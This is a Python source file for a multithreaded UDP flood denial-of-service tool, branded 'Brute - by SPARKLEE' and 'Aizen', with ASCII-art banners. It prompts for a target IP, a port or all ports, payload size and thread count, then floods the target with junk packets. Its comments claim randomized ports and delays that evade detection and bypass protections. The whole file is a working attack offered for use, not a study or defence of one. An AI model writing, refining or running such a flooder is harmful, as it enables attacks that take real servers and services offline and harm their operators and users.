from socket import socket, AF_INET, SOCK_DGRAM, IPPROTO_UDP
import socket as sock
from threading import Thread, Lock
from random import choices, randint, random
from time import time, sleep
import ctypes
import struct

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.sent = 0
        self.total = 0
        self.on = True
        self.lock = Lock()

        # Create multiple sockets
        self.sockets = [self.create_socket() for _ in range(min(threads, 100))]

        # More varied payload patterns
        self.payloads = [
            str.encode("x" * self.force),
            str.encode("0" * self.force),
            str.encode("\x00" * self.force),
            str.encode("\xff" * self.force)
        ]

    def create_socket(self):
        try:
            s = sock.socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
            s.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)

            # Enable socket options to bypass some basic protections
            try:
                s.setsockopt(sock.SOL_IP, sock.IP_HDRINCL, 1)
                s.setsockopt(sock.SOL_SOCKET, sock.SO_BROADCAST, 1)
            except:
                pass

            return s
        except:
            return None

    def flood(self):
        for socket in self.sockets:
            if socket:
                for _ in range(self.threads // len(self.sockets)):
                    Thread(target=self.send, args=(socket,)).start()
        Thread(target=self.info).start()

    def send(self, socket):
        while self.on:
            try:
                payload = choices(self.payloads)[0]
                addr = self._randaddr()

                # Randomize source port
                if random() > 0.5:
                    socket.bind(('0.0.0.0', randint(1024, 65535)))

                socket.sendto(payload, addr)

                with self.lock:
                    self.sent += len(payload)

                # Random delay to avoid easy pattern detection
                if random() > 0.9:
                    sleep(0.01 * random())

            except:
                # Recreate socket if there's an error
                new_socket = self.create_socket()
                if new_socket:
                    socket.close()
                    socket = new_socket
                else:
                    sleep(0.1)

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

    def info(self):
        interval = 0.05
        while self.on:
            with self.lock:
                bandwidth = self.sent / interval
                self.total += self.sent
                self.sent = 0

            print(f"\r{self.total / (1024*1024*1024):.2f} GB sent", end="")
            sleep(interval)

    def stop(self):
        self.on = False
        for socket in self.sockets:
            if socket:
                socket.close()

ascii = r'''
 █     █░ ▒█████   ██▓      █████▒
▓█░ █ ░█░▒██▒  ██▒▓██▒    ▓██   ▒
▒█░ █ ░█ ▒██░  ██▒▒██░    ▒████ ░
░█░ █ ░█ ▒██   ██░▒██░    ░▓█▒  ░
░░██▒██▓ ░ ████▓▒░░██████▒░▒█░
░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒ ░
  ▒ ░ ░    ░ ▒ ▒░ ░ ░ ▒  ░ ░
  ░   ░  ░ ░ ░ ▒    ░ ░    ░
    ░        ░ ░      ░  ░
'''

banner = r"""
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠸⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢸⠸⠀⡠⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⢠⣞⣀⡿⠀⠀⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡖⠁⠀⠀⠀⢸⠈⢈⡇⠀⢀⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠩⢠⡴⠀⠀⠀⠀⠀⠈⡶⠉⠀⠀⡸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠎⢠⣇⠏⠀⠀⠀⠀⠀⠀⠀⠁⠀⢀⠄⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠏⠀⢸⣿⣴⠀⠀⠀⠀⠀⠀⣆⣀⢾⢟⠴⡇  Aizen⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡾⠀⢠⠀⣿⠃⠘⢹⣦⠀⠀⠀⢋⡟⠀⠀⠁⣇⠀⠀ON⠀⠀⠀
⠀⠀⠀⠀⢀⡾⠁⢠⠀⣿⠃⠘⢸⡟⠋⠀⠀⠀⠉⠀⠀⠀⠀⢸⡀⠀TOP⠀⠀
⠀⠀⢀⣴⠫⠤⣶⣿⢀⡏⠀⠀⠘⢸⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀
⠐⠿⢿⣿⣤⣴⣿⣣⢾⡄⠀⠀⠀⠀⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀
⠀⠀⠀⣨⣟⡍⠉⠚⠹⣇⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⢀⡀⣾⡇⠀⠀
⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻⠀⠀
⠀⠀⠘⣰⣿⣿⡄⡆⠀⠀⠀⠳⣼⢦⡘⣄⠀⠀⡟⡷⠃⠘⢶⣿⡎⠻⣆⠀⠀
⠀⠀⠀⡟⡿⢿⡿⠀⠀⠀⠀⠀⠙⠀⠻⢯⢷⣼⠁⠁⠀⠀⠀⠙⢿⡄⡈⢆⠀
⠀⠀⠀⠀⡇⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⠀⠀⠀⠀⠀⠀⡇⢹⢿⡀
⠀⠀⠀⠀⠁⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠇⠁
   ⠁⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

# Add your color definitions here
class Col:
    class light_red: pass
    class light_blue: pass
    class white: pass
    class blue: pass
    class black: pass
    class purple: pass
    class orange: pass

    @staticmethod
    def StaticMIX(colors): return ""
    @staticmethod
    def DynamicMIX(colors): return ""
    @staticmethod
    def Symbol(symbol, col1, col2, left='', right=''): return ""

class Colorate:
    @staticmethod
    def Diagonal(color, text): return text

class Center:
    @staticmethod
    def XCenter(text): return text

class System:
    @staticmethod
    def Size(w, h): pass
    @staticmethod
    def Title(text): pass

class Cursor:
    @staticmethod
    def HideCursor(): pass

def hinput(prompt):
    return input(prompt)

def init():
    System.Size(140, 40)
    System.Title("Brute - by SPARKLEE")
    Cursor.HideCursor()

init()

def stage(text, symbol='...'):
    col1 = Col.purple
    col2 = Col.white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', Col.white, Col.white)} {Col.white}{text}")
    exit()

def main():
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, Col.purple)), Center.XCenter(banner)))

    ip = input(stage(f"Enter the IP to Brutalize {Col.purple}->{Col.white} ", '?'))
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.', ''))
    except:
        error("[Aizen]")

    port = input(stage(f"\033[38;5;208mPORT \033[35m[{Col.white}press \033[38;5;45menter{Col.white} to launch nukes all port\033[35m] \033[35m->\033[38;5;45m ", '?'))
    print()

    if port == '':
        port = None
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Error! Please enter a correct port.")

    force = input(stage(f"\033[38;5;208mEvasion \033[35m[{Col.white}press \033[38;5;45menter{Col.white} for 2000\033[35m] \033[35m->\033[38;5;45m ", '?'))
    print()

    if force == '':
        force = 2000
    else:
        try:
            force = int(force)
        except ValueError:
            error("Error! Please enter an integer.")

    threads = input(stage(f"\033[38;5;208mThreads \033[35m[{Col.white}press \033[38;5;45menter{Col.white} for 100\033[35m] \033[35m->\033[38;5;45m ", '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Error! Please enter an integer.")

    print()
    cport = '' if port is None else f'{Col.purple}:{Col.white}{port}'
    print(stage(f"Attacking... {Col.white}{ip}{cport}{Col.white}."), end='\r')

    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("A fatal error has occured and the attack was stopped.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"{Col.orange}Stopped. {Col.white}{ip}{cport}{Col.white} was Diddled With {Col.white}{round(brute.total, 1)} {Col.white}GB."))
    print('\n')
    sleep(1)

    hinput(stage(f"Press {Col.white}enter{Col.white} to {Col.white}exit{Col.white}.", '.'))

if __name__ == '__main__':
    main()